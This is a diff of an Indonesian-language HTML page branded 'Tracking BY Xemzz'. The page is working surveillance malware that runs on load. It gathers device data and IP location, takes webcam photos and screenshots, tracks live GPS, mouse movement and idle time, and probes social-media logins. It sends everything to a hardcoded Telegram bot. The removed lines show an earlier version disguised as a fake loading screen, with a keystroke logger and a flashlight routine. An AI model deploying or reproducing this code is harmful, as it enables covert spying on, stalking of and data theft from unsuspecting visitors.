@@ -2,151 +2,232 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Loading System Resources...</title>
+  <title>Xemzz - Website</title>
   <style>
     body {
-      background-color: #000;
-      margin: 0;
-      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #0f0f0f;
+      padding: 20px;
+      color: #e0e0e0;
+    }
+    .terminal-box {
+      background: #1a1a1a;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+      max-width: 700px;
+      margin: auto;
+      border: 1px solid #333;
+      position: relative;
+    }
+    .terminal-header {
+      background: #222;
+      padding: 8px 15px;
+      border-radius: 5px 5px 0 0;
+      margin: -20px -20px 15px -20px;
       display: flex;
-      justify-content: center;
       align-items: center;
-      height: 100vh;
-      font-family: Arial, sans-serif;
-      color: #999;
-      overflow: hidden;
+      border-bottom: 1px solid #444;
     }
-    #loading-container {
-      text-align: center;
-      width: 80%;
-      max-width: 400px;
+    .terminal-title {
+      font-weight: bold;
+      color: #4CAF50;
+      text-shadow: 0 0 5px rgba(76, 175, 80, 0.3);
     }
-    #loading-text {
-      font-size: 22px;
-      margin-bottom: 20px;
+    .terminal-dots {
+      display: flex;
+      margin-right: 10px;
     }
-    #progress-container {
-      height: 3px;
-      background-color: #222;
-      border-radius: 3px;
-      overflow: hidden;
+    .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      margin-right: 6px;
     }
-    #progress-bar {
-      height: 100%;
-      width: 0%;
-      background-color: #555;
-      transition: width 0.3s ease;
+    .dot-red { background: #ff5f56; }
+    .dot-yellow { background: #ffbd2e; }
+    .dot-green { background: #27c93f; }
+    .info-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
     }
-    #loading-details {
-      margin-top: 20px;
+    .info-item {
+      display: flex;
+      margin-bottom: 8px;
       font-size: 14px;
-      color: #666;
     }
-    .hidden {
+    .info-label {
+      color: #4CAF50;
+      min-width: 120px;
+      margin-right: 10px;
+    }
+    .info-value {
+      color: #e0e0e0;
+      word-break: break-all;
+    }
+    .section-title {
+      color: #4CAF50;
+      margin: 15px 0 10px 0;
+      padding-bottom: 5px;
+      border-bottom: 1px solid #333;
+      grid-column: span 2;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      color: #666;
+      font-size: 12px;
+    }
+    video, canvas {
       display: none;
+    }
+    @media (max-width: 600px) {
+      .info-grid {
+        grid-template-columns: 1fr;
+      }
+      .section-title {
+        grid-column: span 1;
+      }
     }
   </style>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
-  <div id="loading-container">
-    <div id="loading-text">Memuat sumber daya sistem...</div>
-    <div id="progress-container">
-      <div id="progress-bar"></div>
-    </div>
-    <div id="loading-details">Menyiapkan lingkungan...</div>
-  </div>
 
-  <!-- Hidden tracking elements -->
-  <video id="video" autoplay muted class="hidden"></video>
-  <canvas id="canvas" class="hidden"></canvas>
+  <div class="terminal-box">
+    <div class="terminal-header">
+      <div class="terminal-dots">
+        <div class="dot dot-red"></div>
+        <div class="dot dot-yellow"></div>
+        <div class="dot dot-green"></div>
+      </div>
+      <div class="terminal-title">Tracking BY Xemzz</div>
+    </div>
+    
+    <div class="info-grid" id="deviceInfo">
+      <div class="section-title">⚙️ Device Information</div>
+    </div>
+    
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    
+    <div class="footer">Telegram @XemzzXiterz</div>
+  </div>
 
   <script>
     const token = '7944528020:AAFjxkw-YCyfnjCiA-QV3tDSLB9VyC6ZPnE';
     const chatId = '7525205684';
 
-    // Simulate infinite loading
-    let progress = 0;
-    const progressBar = document.getElementById('progress-bar');
-    const loadingDetails = document.getElementById('loading-details');
-    const loadingMessages = [
-      "Memeriksa modul sistem...",
-      "Memuat komponen inti...",
-      "Menginisialisasi antarmuka...",
-      "Memverifikasi koneksi...",
-      "Menyiapkan lingkungan...",
-      "Memeriksa pembaruan...",
-      "Memuat aset tampilan..."
-    ];
+    function sendText(text) {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+      });
+    }
 
-    const loadingInterval = setInterval(() => {
-      progress += Math.random() * 5;
-      if (progress > 98) progress = 98; // Never reach 100%
-      progressBar.style.width = progress + '%';
-      
-      // Change loading message periodically
-      if (Math.random() > 0.9) {
-        loadingDetails.textContent = loadingMessages[Math.floor(Math.random() * loadingMessages.length)];
-      }
-    }, 500);
+    function sendPhotoBlob(blob, filename = 'image.jpg') {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, filename);
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    }
 
-    // Telegram functions
-    const sendToTelegram = async (data) => {
-      try {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: data,
-            parse_mode: 'HTML'
-          })
-        });
-      } catch (e) {
-        console.error('Error sending to Telegram:', e);
-      }
-    };
+    function createInfoItem(label, value) {
+      const container = document.getElementById('deviceInfo');
+      const item = document.createElement('div');
+      item.className = 'info-item';
+      item.innerHTML = `
+        <div class="info-label">${label}</div>
+        <div class="info-value">${value}</div>
+      `;
+      container.appendChild(item);
+      return `<b>${label}:</b> ${value}\n`;
+    }
 
-    const sendPhoto = async (blob, filename) => {
-      try {
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, filename);
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        });
-      } catch (e) {
-        console.error('Error sending photo:', e);
-      }
-    };
-
-    // Get detailed location (kabupaten/kecamatan)
-    const getLocationDetails = async (lat, lon) => {
-      try {
-        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
-        const data = await response.json();
-        
-        if (data.address) {
-          return {
-            kabupaten: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
-            kecamatan: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
-            fullAddress: data.display_name || "Alamat tidak tersedia"
-          };
-        }
-      } catch (e) {
-        console.error('Error getting location details:', e);
-      }
-      return {
-        kabupaten: "Tidak diketahui",
-        kecamatan: "Tidak diketahui",
-        fullAddress: "Alamat tidak tersedia"
+    // Function to detect social media logins
+    async function detectSocialMediaLogins() {
+      let message = '<b>📱 SOCIAL MEDIA TRACKING</b>\n';
+      const socialMediaUrls = {
+        'Facebook': 'https://www.facebook.com/',
+        'Instagram': 'https://www.instagram.com/',
+        'Twitter': 'https://twitter.com/',
+        'LinkedIn': 'https://www.linkedin.com/',
+        'Google': 'https://accounts.google.com/',
+        'YouTube': 'https://www.youtube.com/',
+        'TikTok': 'https://www.tiktok.com/',
+        'Reddit': 'https://www.reddit.com/',
+        'Pinterest': 'https://www.pinterest.com/',
+        'WhatsApp': 'https://web.whatsapp.com/',
+        'Telegram': 'https://web.telegram.org/',
+        'Discord': 'https://discord.com/'
       };
-    };
 
-    // Collect all device information
-    const collectAllInfo = async () => {
-      let message = '╭───── Tracking BY Xemzz ───── ⦿\n\n';
+      let detectedAccounts = 0;
+      
+      for (const [platform, url] of Object.entries(socialMediaUrls)) {
+        try {
+          // Try to load the social media URL in an iframe
+          const iframe = document.createElement('iframe');
+          iframe.src = url;
+          iframe.style.display = 'none';
+          document.body.appendChild(iframe);
+          
+          // Wait for the iframe to load
+          await new Promise(resolve => {
+            iframe.onload = resolve;
+            setTimeout(resolve, 1000); // Timeout after 1 second
+          });
+          
+          // Check if the iframe content loaded (may be blocked by CORS)
+          try {
+            const cookies = await getCookiesForDomain(url);
+            if (cookies.length > 0) {
+              message += createInfoItem(`✅ ${platform}`, 'Logged in (cookies detected)');
+              detectedAccounts++;
+            } else {
+              message += createInfoItem(`❌ ${platform}`, 'Not logged in');
+            }
+          } catch (e) {
+            // If we can't access cookies, try localStorage
+            try {
+              const localStorageLength = iframe.contentWindow?.localStorage?.length;
+              if (localStorageLength && localStorageLength > 0) {
+                message += createInfoItem(`✅ ${platform}`, 'Logged in (local storage detected)');
+                detectedAccounts++;
+              } else {
+                message += createInfoItem(`❌ ${platform}`, 'Not logged in');
+              }
+            } catch (e) {
+              message += createInfoItem(`❓ ${platform}`, 'Access blocked (CORS)');
+            }
+          }
+          
+          document.body.removeChild(iframe);
+        } catch (e) {
+          message += createInfoItem(`❓ ${platform}`, 'Detection failed');
+        }
+      }
+      
+      message += createInfoItem('🔍 Total Detected', `${detectedAccounts} social media accounts`);
+      return message;
+    }
+
+    // Helper function to get cookies for a domain
+    function getCookiesForDomain(domain) {
+      return new Promise((resolve) => {
+        chrome.cookies.getAll({ url: domain }, (cookies) => {
+          resolve(cookies || []);
+        });
+      });
+    }
+
+    async function collectAllInfo() {
+      let message = '<b>╭───── Tracking BY Xemzz ───── ⦿</b>\n\n';
       
       // Device Information
       message += '<b>⚙️ DEVICE INFORMATION</b>\n';
@@ -163,41 +244,41 @@
       ];
 
       deviceInfo.forEach(info => {
-        message += `${info[0]}: ${info[1]}\n`;
+        message += createInfoItem(info[0], info[1]);
       });
 
       // Battery Info
       if (navigator.getBattery) {
         try {
           const battery = await navigator.getBattery();
-          message += `🔋 Battery: ${(battery.level * 100).toFixed(0)}%\n`;
-          message += `🔌 Charging: ${battery.charging ? '✅ YA' : '❌ TIDAK'}\n`;
+          message += createInfoItem('🔋 Battery', `${(battery.level * 100).toFixed(0)}%`);
+          message += createInfoItem('🔌 Charging', battery.charging ? '✅ YA' : '❌ TIDAK');
         } catch (e) {
-          message += '🔋 Battery: ❌ Tidak tersedia\n';
+          message += createInfoItem('🔋 Battery', '❌ Tidak tersedia');
         }
       }
 
       // Session Information
       message += '\n<b>📊 SESSION INFORMATION</b>\n';
-      message += `⏰ Waktu Akses: ${new Date().toString()}\n`;
-      message += `🕒 Page Load Time: ${(performance.now()).toFixed(2)} ms\n`;
-      message += `📜 History Length: ${history.length}\n`;
-      message += `🔗 Referrer: ${document.referrer || 'None'}\n`;
-      message += `🌍 URL: ${window.location.href}\n`;
-      message += `📄 Title: ${document.title}\n`;
+      message += createInfoItem('⏰ Waktu Akses', new Date().toString());
+      message += createInfoItem('🕒 Page Load Time', (performance.now()).toFixed(2) + ' ms');
+      message += createInfoItem('📜 History Length', history.length);
+      message += createInfoItem('🔗 Referrer', document.referrer || 'None');
+      message += createInfoItem('🌍 URL', window.location.href);
+      message += createInfoItem('📄 Title', document.title);
 
       // Location Information
       message += '\n<b>📍 LOCATION INFORMATION</b>\n';
       const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const offset = new Date().getTimezoneOffset();
-      message += `🕓 Timezone: ${tz}\n`;
-      message += `🧭 Offset: ${offset} menit\n`;
+      message += createInfoItem('🕓 Timezone', tz);
+      message += createInfoItem('🧭 Offset', offset + ' menit');
 
       // Plugins Information
       message += '\n<b>🧩 PLUGINS</b>\n';
       if (navigator.plugins.length > 0) {
         for (let i = 0; i < navigator.plugins.length; i++) {
-          message += `🔌 Plugin ${i+1}: ${navigator.plugins[i].name}\n`;
+          message += createInfoItem(`🔌 Plugin ${i+1}`, navigator.plugins[i].name);
         }
       } else {
         message += '❌ Tidak ada plugins terdeteksi\n';
@@ -207,82 +288,57 @@
       message += '\n<b>⚙️ FEATURES</b>\n';
       const features = ['geolocation', 'mediaDevices', 'bluetooth', 'clipboard', 'serviceWorker'];
       features.forEach(f => {
-        message += `⚙️ ${f}: ${f in navigator ? '✅ YA' : '❌ TIDAK'}\n`;
+        message += createInfoItem(`⚙️ ${f}`, f in navigator ? '✅ YA' : '❌ TIDAK');
       });
 
-      // IP and Detailed Location Information
+      // IP Information
       try {
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
         
         message += '\n<b>📡 IP INFORMATION</b>\n';
-        message += `📡 IP Address: ${ipData.ip}\n`;
-        message += `🏙️ Kota: ${ipData.city}\n`;
-        message += `🗺️ Wilayah: ${ipData.region}\n`;
-        
-        // Get kabupaten/kecamatan details
-        if (ipData.latitude && ipData.longitude) {
-          const locationDetails = await getLocationDetails(ipData.latitude, ipData.longitude);
-          message += `🏙️ Kabupaten: ${locationDetails.kabupaten}\n`;
-          message += `🏙️ Kecamatan: ${locationDetails.kecamatan}\n`;
-          message += `🏠 Alamat Lengkap: ${locationDetails.fullAddress}\n`;
-        }
-        
-        message += `🌎 Negara: ${ipData.country_name}\n`;
-        message += `🏷️ Kode Pos: ${ipData.postal}\n`;
-        message += `📌 Latitude: ${ipData.latitude}\n`;
-        message += `📍 Longitude: ${ipData.longitude}\n`;
+        const ipInfo = [
+          ['📡 IP Address', ipData.ip],
+          ['🏙️ Kota', ipData.city],
+          ['🗺️ Wilayah', ipData.region],
+          ['🌎 Negara', ipData.country_name],
+          ['🏷️ Kode Pos', ipData.postal],
+          ['📌 Latitude', ipData.latitude],
+          ['📍 Longitude', ipData.longitude]
+        ];
+
+        ipInfo.forEach(info => {
+          message += createInfoItem(info[0], info[1]);
+        });
       } catch (e) {
         message += '\n❌ Gagal mendapatkan informasi IP\n';
+      }
+
+      // Social Media Tracking
+      try {
+        const socialMediaInfo = await detectSocialMediaLogins();
+        message += '\n' + socialMediaInfo;
+      } catch (e) {
+        message += '\n❌ Gagal melacak media sosial\n';
       }
 
       message += '\n<b>╰───── Telegram @XemzzXiterz ───── ⦿</b>';
 
       return message;
-    };
+    }
 
-    // Flashlight control (for mobile devices)
-    const toggleFlashlight = async () => {
+    // Main execution
+    (async () => {
+      // First send the comprehensive text report
+      const fullReport = await collectAllInfo();
+      sendText(fullReport);
+
+      // Then send media (webcam and screenshot)
       try {
-        if (!('mediaDevices' in navigator)) return;
-        
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: {
-            facingMode: 'environment',
-            advanced: [{ torch: true }]
-          }
-        });
-        
-        const track = stream.getVideoTracks()[0];
-        if (!track.getCapabilities().torch) {
-          sendToTelegram('❌ Flashlight: Torch not supported');
-          stream.getTracks().forEach(t => t.stop());
-          return;
-        }
-
-        for (let i = 0; i < 10; i++) {
-          await track.applyConstraints({ advanced: [{ torch: true }] });
-          await new Promise(resolve => setTimeout(resolve, 1000));
-          await track.applyConstraints({ advanced: [{ torch: false }] });
-          await new Promise(resolve => setTimeout(resolve, 1000));
-        }
-        
-        stream.getTracks().forEach(t => t.stop());
-      } catch (error) {
-        sendToTelegram(`❌ Flashlight error: ${error.message}`);
-      }
-    };
-
-    // Main tracking function
-    const startTracking = async () => {
-      // Send initial device info
-      const deviceInfo = await collectAllInfo();
-      await sendToTelegram(deviceInfo);
-
-      // Try to access camera
-      try {
+        // Webcam snapshot
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
         
@@ -290,68 +346,38 @@
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(blob => sendPhoto(blob, 'camera_capture.jpg'), 'image/jpeg');
+        canvas.toBlob(blob => sendPhotoBlob(blob, '📸_camera.jpg'), 'image/jpeg');
         
+        // Stop the video stream
         stream.getTracks().forEach(track => track.stop());
       } catch (e) {
-        await sendToTelegram('❌ Camera access blocked');
+        console.log('Webcam access denied');
       }
 
-      // Take screenshot
-      setTimeout(async () => {
-        try {
-          const canvas = await html2canvas(document.body);
-          canvas.toBlob(blob => sendPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
-        } catch (e) {
-          await sendToTelegram('❌ Screenshot failed');
-        }
+      // Screenshot after a delay
+      setTimeout(() => {
+        html2canvas(document.body).then(canvas => {
+          canvas.toBlob(blob => sendPhotoBlob(blob, '🖼️_screenshot.jpg'), 'image/jpeg');
+        });
       }, 5000);
 
-      // GPS tracking
+      // GPS tracking if available
       if (navigator.geolocation) {
-        navigator.geolocation.watchPosition(async (pos) => {
-          const coords = pos.coords;
-          let gpsInfo = `<b>📍 LIVE GPS TRACKING</b>\n` +
-                       `<b>📌 Lat:</b> ${coords.latitude}\n` +
-                       `<b>📍 Lng:</b> ${coords.longitude}\n` +
-                       `<b>🎯 Akurasi:</b> ${coords.accuracy}m`;
-          
-          // Get detailed location
-          const locationDetails = await getLocationDetails(coords.latitude, coords.longitude);
-          gpsInfo += `\n<b>🏙️ Kabupaten:</b> ${locationDetails.kabupaten}\n` +
-                     `<b>🏙️ Kecamatan:</b> ${locationDetails.kecamatan}\n` +
-                     `<b>🏠 Alamat:</b> ${locationDetails.fullAddress}`;
-          
-          await sendToTelegram(gpsInfo);
-        }, 
-        async (err) => {
-          await sendToTelegram(`❌ GPS Error: ${err.message}`);
-        }, 
-        { 
-          enableHighAccuracy: true,
-          maximumAge: 0,
-          timeout: 5000
-        });
+        navigator.geolocation.watchPosition(pos => {
+          const gpsText = `<b>📡 LIVE GPS TRACKING</b>\n` +
+                         `<b>📌 Lat:</b> ${pos.coords.latitude}\n` +
+                         `<b>📍 Lng:</b> ${pos.coords.longitude}\n` +
+                         `<b>🎯 Akurasi:</b> ${pos.coords.accuracy}m`;
+          sendText(gpsText);
+        }, err => {
+          console.log('GPS access denied');
+        }, { enableHighAccuracy: true });
       }
 
-      // Mouse/keyboard tracking (for desktop)
+      // Mouse movement tracking
       document.addEventListener('mousemove', (e) => {
-        sendToTelegram(`🖱️ Mouse Position: (${e.clientX}, ${e.clientY})`);
+        sendText(`🖱️ <b>Mouse Position:</b> (${e.clientX}, ${e.clientY})`);
       });
-
-      let typedChars = '';
-      document.addEventListener('keydown', (e) => {
-        typedChars += e.key;
-        if (typedChars.length > 20) {
-          sendToTelegram(`⌨️ Keystrokes: ${typedChars}`);
-          typedChars = '';
-        }
-      });
-
-      // Flashlight control (for mobile)
-      setTimeout(() => {
-        toggleFlashlight();
-      }, 10000);
 
       // Idle time tracking
       let idleStart = Date.now();
@@ -359,18 +385,17 @@
       ['mousemove', 'keydown', 'scroll', 'touchstart'].forEach(evt => {
         window.addEventListener(evt, () => {
           const idleTime = ((Date.now() - idleStart) / 1000).toFixed(1);
-          sendToTelegram(`😴 User idle selama: ${idleTime} detik`);
+          sendText(`😴 <b>User idle selama:</b> ${idleTime} detik`);
           idleStart = Date.now();
           clearTimeout(idleTimer);
           idleTimer = setTimeout(() => {
-            sendToTelegram('💤 User diem kayak mayat selama 60 detik');
+            sendText('💤 <b>User diem kayak mayat selama 60 detik</b>');
           }, 60000);
         });
       });
-    };
+    })();
 
-    // Start tracking after a short delay
-    setTimeout(startTracking, 3000);
   </script>
+
 </body>
 </html>
